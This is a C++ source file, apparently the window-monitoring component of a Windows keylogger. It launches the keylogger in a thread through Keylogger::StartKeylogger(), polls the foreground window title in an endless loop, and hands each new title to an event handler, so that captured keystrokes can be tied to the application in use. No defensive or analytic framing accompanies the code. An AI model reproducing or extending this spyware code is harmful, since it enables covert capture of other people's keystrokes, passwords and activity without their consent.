#include "WindowManager.h"
#include "EventManager.h"
#include "Keylogger.h"
#include <iostream>
#include <thread>


// Define a type alias `Action` for a pointer to a function with no parameters and no return value
typedef void (*Action)();

// Define a static vector of `Action` functions in the `WindowManager` class
std::vector<Action> WindowManager::functions;

// Definition of the thread function for the `WindowManager` class
void WindowManager::myThreadFunc()
{
    // Start the keylogger by invoking a function from the `Keylogger` class
    Keylogger::StartKeylogger();

    // Output a message to indicate that the thread is running
    std::cout << "Thread is running" << std::endl;
}

// Retrieve the title of the currently active (foreground) window
std::string WindowManager::GetActiveWindowTitle()
{
    try
    {
        // Obtain a handle to the currently active window
        HWND hwnd = GetForegroundWindow();
        DWORD pid; // Variable to hold the process ID associated with the window

        // Retrieve the process ID of the active window's owning process
        GetWindowThreadProcessId(hwnd, &pid);

        // Open the process to query information and read its memory
        HANDLE handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

        // If the process handle is invalid, return "Unknown"
        if (handle == NULL) return "Unknown";

        char title[1024]; // Buffer to store the window title

        // Attempt to retrieve the title of the active window
        if (GetWindowText(hwnd, title, 1024))
        {
            CloseHandle(handle); // Close the process handle
            return std::string(title); // Return the window title as a string
        }
        else
        {
            // If retrieval fails, get the error code
            DWORD error = GetLastError();

            CloseHandle(handle); // Close the process handle
            return std::string("Unknown"); // Return "Unknown" as the fallback
        }
    }
    catch (const std::exception&)
    {
        // Catch and handle any exceptions by returning "Unknown"
        return std::string("Unknown");
    }
}

// Main function to run the `WindowManager`
void WindowManager::Run()
{
    // Pause execution for 1 second (1000 milliseconds) to stabilize the setup
    Sleep(1000);

    // The following commented-out lines suggest potential actions that could be added to the functions vector:
    // functions.push_back(EventManager::Action);

    std::string ActiveWindow;
    std::string pervActiveWindow = "";

    // Infinite loop to monitor the active window
    while (true)
    {
        // Pause execution for 2 seconds (2000 milliseconds) to reduce CPU usage
        Sleep(2100);

        // Get the title of the active window
        ActiveWindow = GetActiveWindowTitle();

        // If the active window title hasn't changed, skip the rest of the loop
        if (ActiveWindow == pervActiveWindow)
        {
            continue;
        }

        // Update the previously active window title to the current one
        pervActiveWindow = ActiveWindow;

        // Call the action function from the `EventManager` class with the new active window title
        EventManager::Action(ActiveWindow);
    }
}
